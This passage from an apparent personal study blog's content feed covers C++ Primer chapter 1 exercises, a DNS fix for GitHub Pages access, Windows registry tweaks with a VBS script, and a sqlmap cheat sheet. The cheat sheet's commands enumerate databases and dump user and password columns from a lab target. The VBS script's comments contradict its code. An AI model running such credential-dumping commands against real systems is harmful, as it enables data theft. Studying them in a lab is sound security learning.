       </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; b++ &lt;&lt; <span class="string">" "</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 请输入两个数:5 9</span></span><br><span class="line"><span class="comment"> * 5 6 7 8 9 </span></span><br><span class="line"><span class="comment"> * 请输入两个数:10 1</span></span><br><span class="line"><span class="comment"> * 1 2 3 4 5 6 7 8 9 10 </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="1-4-2节练习"><a href="#1-4-2节练习" class="headerlink" title="1.4.2节练习"></a>1.4.2节练习</h2><h3 id="1-12下面for循环完成了什么功能？sum的最终值是多少？"><a href="#1-12下面for循环完成了什么功能？sum的最终值是多少？" class="headerlink" title="1.12下面for循环完成了什么功能？sum的最终值是多少？"></a>1.12下面for循环完成了什么功能？sum的最终值是多少？</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">-100</span>; i &lt;= <span class="number">100</span>; ++i) </span><br><span class="line">    sum += i;</span><br><span class="line"><span class="comment">//实现了累加功能，sum的最终值为0</span></span><br></pre></td></tr></table></figure>

<h3 id="1-13使用for循环重做1-4-1节的练习"><a href="#1-13使用for循环重做1-4-1节的练习" class="headerlink" title="1.13使用for循环重做1.4.1节的练习"></a>1.13使用for循环重做1.4.1节的练习</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1.9</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">50</span>; i &lt;= <span class="number">100</span>; ++i) </span><br><span class="line">        sum += i;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[50,100]相加的值是"</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.10</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">10</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.11</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入两个整数"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="keyword">if</span> (a &lt;= b) &#123;</span><br><span class="line">        <span class="keyword">for</span> ( ; a &lt;= b; ++a)         </span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="string">" "</span>;       </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> ( ; b &lt;= a; ++b)                       </span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; b &lt;&lt; <span class="string">" "</span>;                     </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-14while循环和for循环，两种形式的优缺点各是什么？"><a href="#1-14while循环和for循环，两种形式的优缺点各是什么？" class="headerlink" title="1.14while循环和for循环，两种形式的优缺点各是什么？"></a>1.14while循环和for循环，两种形式的优缺点各是什么？</h3><blockquote>
<ol>
<li>for循环：一般用于循环次数已知的情况，形式较为简洁。循环头定义的变量，修改变量的值，在循环结束后，便会释放节省空间。</li>
<li>while循环：一般用于循环次数未知的情况。while循环的初始化语句一般在while循环之前，在循环体中修改变量的值。形式上不如for循环来的简洁。</li>
<li>两者是可以进行相互转化的</li>
</ol>
</blockquote>
<h3 id="程序常见错误与键盘输入文件终止符EOF"><a href="#程序常见错误与键盘输入文件终止符EOF" class="headerlink" title="程序常见错误与键盘输入文件终止符EOF"></a>程序常见错误与键盘输入文件终止符EOF</h3><blockquote>
<p>常见错误：P14</p>
<ol>
<li>语法错误，例如缺少;</li>
<li>类型错误，例如将字符串字面常量赋值给整数类型的变量</li>
<li>声明错误，变量必须先声明后使用</li>
</ol>
</blockquote>
<blockquote>
<p>输入文件终止符EOF<br>Windows：Ctrl+Z<br>Unix/Mac OS X：Ctrl+D</p>
</blockquote>
<h2 id="1-4-3节练习"><a href="#1-4-3节练习" class="headerlink" title="1.4.3节练习"></a>1.4.3节练习</h2><h3 id="1-16从cin读取一组数，输出其和"><a href="#1-16从cin读取一组数，输出其和" class="headerlink" title="1.16从cin读取一组数，输出其和"></a>1.16从cin读取一组数，输出其和</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">        sum += n;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"sum = "</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Ctrl+D 来终止输入</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-4节练习"><a href="#1-4-4节练习" class="headerlink" title="1.4.4节练习"></a>1.4.4节练习</h2><h3 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h3><p>如果输入的所有值都相等，就只会输出一条输出就类似1 occurs 5 times，然后没了。如果没有重复的值则是1 occurs 1 times; 2 occurs 1 times; 3 occurs 1 times……</p>
<h3 id="1-18验证1-17"><a href="#1-18验证1-17" class="headerlink" title="1.18验证1.17"></a>1.18验证1.17</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Copyright (c) 2013 by Objectwrite, Inc., Josee Lajoie, and Barbara E. Moo.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// currVal is the number we're counting; we'll read new values into val</span></span><br><span class="line">	<span class="keyword">int</span> currVal = <span class="number">0</span>, val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// read first number and ensure that we have data to process</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; currVal) &#123;        </span><br><span class="line">		<span class="keyword">int</span> cnt = <span class="number">1</span>;  <span class="comment">// store the count for the current value we're processing</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; val) &#123; <span class="comment">// read the remaining numbers </span></span><br><span class="line">			<span class="keyword">if</span> (val == currVal)   <span class="comment">// if the values are the same</span></span><br><span class="line">				++cnt;            <span class="comment">// add 1 to cnt </span></span><br><span class="line">			<span class="keyword">else</span> &#123; <span class="comment">// otherwise, print the count for the previous value</span></span><br><span class="line">				<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; currVal &lt;&lt; <span class="string">" occurs "</span> </span><br><span class="line">				          &lt;&lt; cnt &lt;&lt; <span class="string">" times"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">				currVal = val;    <span class="comment">// remember the new value</span></span><br><span class="line">				cnt = <span class="number">1</span>;          <span class="comment">// reset the counter</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;  <span class="comment">// while loop ends here</span></span><br><span class="line">		<span class="comment">// remember to print the count for the last value in the file</span></span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; currVal &lt;&lt; <span class="string">" occurs "</span> </span><br><span class="line">		          &lt;&lt; cnt &lt;&lt; <span class="string">" times"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	&#125; <span class="comment">// outermost if statement ends here</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 重复值：1 occurs 12 times</span></span><br><span class="line"><span class="comment"> * 不重复值：</span></span><br><span class="line"><span class="comment"> *  32 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  432 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  54 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  65 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  76 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  87 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  12 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  34 occurs 1 times</span></span><br><span class="line"><span class="comment"> *  65 occurs 1 times</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="1-19"><a href="#1-19" class="headerlink" title="1.19"></a>1.19</h3><p>见1.4.1中的1.11</p>
<h2 id="1-5-1节练习"><a href="#1-5-1节练习" class="headerlink" title="1.5.1节练习"></a>1.5.1节练习</h2><h3 id="1-20"><a href="#1-20" class="headerlink" title="1.20"></a>1.20</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Sales_item.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Sales_item item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; item)</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; item &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-21"><a href="#1-21" class="headerlink" title="1.21"></a>1.21</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Sales_item.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Sales_item item1, item2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; item1 &gt;&gt; item2;</span><br><span class="line">    <span class="keyword">if</span> (item1.isbn() == item2.isbn()) &#123;</span><br><span class="line">        item1 += item2;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; item1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The isbn is not the same"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-22"><a href="#1-22" class="headerlink" title="1.22"></a>1.22</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Sales_item.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Sales_item total;</span><br><span class="line">    Sales_item item;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; total) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; item) &#123;</span><br><span class="line">            total = total + item;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-5-2节练习"><a href="#1-5-2节练习" class="headerlink" title="1.5.2节练习"></a>1.5.2节练习</h2><h3 id="1-23"><a href="#1-23" class="headerlink" title="1.23"></a>1.23</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Sales_item.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Sales_item transation;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; transation) &#123;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">1</span>;</span><br><span class="line">        Sales_item item;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (transation.isbn() == item.isbn()) &#123;</span><br><span class="line">                transation += item;</span><br><span class="line">                ++cnt;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; transation.isbn() &lt;&lt; <span class="string">":"</span>&lt;&lt; cnt &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                transation = item; <span class="comment">//记得更新</span></span><br><span class="line">                cnt = <span class="number">1</span>;<span class="comment">//记得更新</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; transation.isbn() &lt;&lt; <span class="string">":"</span>&lt;&lt; cnt &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"Please input the right data!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-24测试1-23"><a href="#1-24测试1-23" class="headerlink" title="1.24测试1.23"></a>1.24测试1.23</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;1.23 &lt;infile</span><br><span class="line">.&#x2F;1.23 &lt;infile &gt;outfile &amp;&amp; cat outfile</span><br><span class="line">&#x2F;&#x2F;infile</span><br><span class="line">0-201-78345-X 3 20.00</span><br><span class="line">0-201-78345-X 2 25.00</span><br><span class="line">0-201-78345-X 3 20.00</span><br><span class="line">0-201-78345-X 2 25.00</span><br><span class="line">0-201-70353-X 4 24.99</span><br></pre></td></tr></table></figure>

<h2 id="1-6节练习"><a href="#1-6节练习" class="headerlink" title="1.6节练习"></a>1.6节练习</h2><h3 id="1-25"><a href="#1-25" class="headerlink" title="1.25"></a>1.25</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Sales_item.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Sales_item total;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; total) &#123;</span><br><span class="line">        Sales_item trans;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; trans) &#123;</span><br><span class="line">            <span class="keyword">if</span> (total.isbn() == trans.isbn()) &#123;</span><br><span class="line">                total += trans;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                total = trans; <span class="comment">//记得更新</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; total &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"No data?!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="感想与评价"><a href="#感想与评价" class="headerlink" title="感想与评价"></a>感想与评价</h2><blockquote>
<p>我这个人啊，就是眼高手低。有时候也很容易就放弃了。对人对事，有时候态度也不好，以自我为中心考虑事情。我有时候真的挺讨厌自己，虽然近年，脾气性格收敛了不少，在态度上也有些进步。但是依然是无法掩盖自己的缺点给别人带来的困扰。—2020/4/22</p>
</blockquote>
<blockquote>
<p>也总是是写完了第一章的作业。也算是一点小欣慰吧！向第二章进发。—2020/4/22</p>
</blockquote>
]]></content>
      <categories>
        <category>Primer_C++_Exercise</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>primer c++</tag>
      </tags>
  </entry>
  <entry>
    <title>访问GitHub Page时断时续问题</title>
    <url>/2020/04/15/%E8%AE%BF%E9%97%AEGitHub%20Page%E6%97%B6%E6%96%AD%E6%97%B6%E7%BB%AD%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在搭建完Github Page之后，发现使用WIFI时Github Page类的站点有时无法访问到，一开始我以为是被墙了，后来使用手机热点进行对比，手机热点没有出现过连接不上的现象。</p>
<h2 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h2><p>那么我猜测可能是DNS的IP配置有误。果然，查看发现，DHCP分配的DNS地址为自家网关的地址。这也可以解释，我为什么有时上外国网站时速度很慢。</p>
<h2 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h2><p>方法一：将DHCP获取IP，更改为手动填写IP，填入DNS地址<br>方法二：在路由器上，修改DHCP的配置信息，填入DNS地址，而不是留下类似0.0.0.0这样的默认配置</p>
<h2 id="常见DNS域名服务器"><a href="#常见DNS域名服务器" class="headerlink" title="常见DNS域名服务器"></a>常见DNS域名服务器</h2><blockquote>
<p>DNSPod DNS:</p>
<ol>
<li>首选：119.29.29.29</li>
<li>备选：182.254.116.116</li>
</ol>
</blockquote>
<blockquote>
<p>114 DNS:</p>
<ol>
<li>首选：114.114.114.114</li>
<li>备选：115.115.115.115</li>
</ol>
</blockquote>
<blockquote>
<p>CNNIC SDNS:</p>
<ol>
<li>首选：1.2.4.8</li>
<li>备选：202.98.0.6</li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>DNS</category>
      </categories>
      <tags>
        <tag>dns</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap基本使用命令</title>
    <url>/2020/04/19/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="列举数据库名称"><a href="#列举数据库名称" class="headerlink" title="列举数据库名称"></a>列举数据库名称</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.20.143&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs</span><br></pre></td></tr></table></figure>

<h2 id="列举指定数据库中的表"><a href="#列举指定数据库中的表" class="headerlink" title="列举指定数据库中的表"></a>列举指定数据库中的表</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs -D 数据库名称 --tables</span><br><span class="line">example: sqlmap -u &quot;192.168.20.143&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs -D dvwa --tables</span><br></pre></td></tr></table></figure>

<h2 id="列举表结构"><a href="#列举表结构" class="headerlink" title="列举表结构"></a>列举表结构</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs -D 数据库名称 -T 表名 --columns</span><br><span class="line">example: sqlmap -u &quot;192.168.20.143&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>

<h2 id="显示表中的数据"><a href="#显示表中的数据" class="headerlink" title="显示表中的数据"></a>显示表中的数据</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs -D 数据库名称 -T 表名 -C 字段名(使用,分割) --dump</span><br><span class="line">sqlmap -u &quot;192.168.20.143&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>

<h2 id="Sqlmap设置多线程"><a href="#Sqlmap设置多线程" class="headerlink" title="Sqlmap设置多线程"></a>Sqlmap设置多线程</h2><p>Sqlmap默认是单线程访问的，扫描的顺序串行执行，必须要等到上一次请求成功后才会执行后面的扫描，这样以来，扫描的效率就会低很多。因为网络连接是耗时操作，等待服务端响应的这段时间，Sqlmap就什么都做不了，本地的CPU、内存资源得不到有利的利用。而多个线程并行处理请求则可以有效的利用本地系统资源。但是设置线程太多也不好，因为线程越多，服务端的压力越大，可能会导致响应速度大幅度降低甚至出现丢包现象，导致请求无响应。所以Sqlmap最大只能设置10个线程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--thread 10</span><br></pre></td></tr></table></figure>

<h2 id="从不询问用户输入，使用所有默认配置"><a href="#从不询问用户输入，使用所有默认配置" class="headerlink" title="从不询问用户输入，使用所有默认配置"></a>从不询问用户输入，使用所有默认配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--batch</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>注册表常见表项</title>
    <url>/2020/04/20/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%B8%B8%E8%A7%81%E8%A1%A8%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="关闭开机自启动"><a href="#关闭开机自启动" class="headerlink" title="关闭开机自启动"></a>关闭开机自启动</h2><p>删除对应键值即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
<h2 id="锁定IE默认页，无法修改"><a href="#锁定IE默认页，无法修改" class="headerlink" title="锁定IE默认页，无法修改"></a>锁定IE默认页，无法修改</h2><p>手动创建或采用vbs脚本都可以，值为1生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">On Error Resume Next &#39;启动或关闭一个错误处理常式</span><br><span class="line">dim r &#39;定义变量</span><br><span class="line">Set r&#x3D;CreateObject(&quot;Wscript.Shell&quot;) &#39;创建并返回一个对 ActiveX 对象的引用</span><br><span class="line">r.Regwrite &quot;HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage&quot;,0,&quot;REG_DWORD&quot;</span><br><span class="line">&#39;设置指定的注册表键或值；此为隐藏关闭按钮</span><br></pre></td></tr></table></figure>
<h2 id="Win菜单栏无关机选项"><a href="#Win菜单栏无关机选项" class="headerlink" title="Win菜单栏无关机选项"></a>Win菜单栏无关机选项</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;REG_DWORD</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose</span><br></pre></td></tr></table></figure>

<h2 id="各类右键菜单添加与删除"><a href="#各类右键菜单添加与删除" class="headerlink" title="各类右键菜单添加与删除"></a>各类右键菜单添加与删除</h2><h3 id="删除文件鼠标右击选项菜单"><a href="#删除文件鼠标右击选项菜单" class="headerlink" title="删除文件鼠标右击选项菜单"></a>删除文件鼠标右击选项菜单</h3><p>找到相应项，然后删除即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CLASSES_ROOT\Directory\Shellex\ContextMenuHandlers</span><br><span class="line">HKEY_CLASSES_ROOT\Directory\Shell</span><br><span class="line">HKEY_CLASSES_ROOT\Folder\shell</span><br><span class="line">HKEY_CLASSES_ROOT\Folder\shellex\ContextMenuHandlers</span><br><span class="line">HKEY_CLASSES_ROOT\*\shell</span><br><span class="line">HKEY_CLASSES_ROOT\*\shellex\ContextMenuHandlers</span><br></pre></td></tr></table></figure>

<h3 id="删除右击“新建”菜单"><a href="#删除右击“新建”菜单" class="headerlink" title="删除右击“新建”菜单"></a>删除右击“新建”菜单</h3><p>注册表中的HKEY_CLASSES_ROOT根键下存放着所有文件类型的信息，如[HKEY_CLASSES_ROOT*.doc]就是Word文档的相关信息，在右键菜单的“新建”菜单中发现了“新建Word文档”的选项，那么在这个键值下删除“Shellnew”后，右键的“新建”菜单中就没有了“新建Word文档”的选项，其它类型的文件我们也可以这样操作。类似的只需找到对应的即可</p>
<h3 id="清理IE右键菜单"><a href="#清理IE右键菜单" class="headerlink" title="清理IE右键菜单"></a>清理IE右键菜单</h3><p>在MenuExt之下找到对应删除即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>注册表</category>
      </categories>
      <tags>
        <tag>注册表</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>shell经典案例</title>
    <url>/2020/04/21/shell%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>TCPIP网络编程习题</title>
    <url>/2020/04/26/TCPIP%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<h2 id="第一章习题"><a href="#第一章习题" class="headerlink" title="第一章习题"></a>第一章习题</h2><ol>
<li>套接字在网络编程中的作用是什么？为何称它为套接字？<blockquote>
<p>作用：套接字是网络数据传输用的软件设备，用于计算机之间的网络数据传输。<br>socket本身具有“连接”的含义，如果将其引申，则可以表示两台计算机之间的网络连接。</p>
</blockquote>
</li>
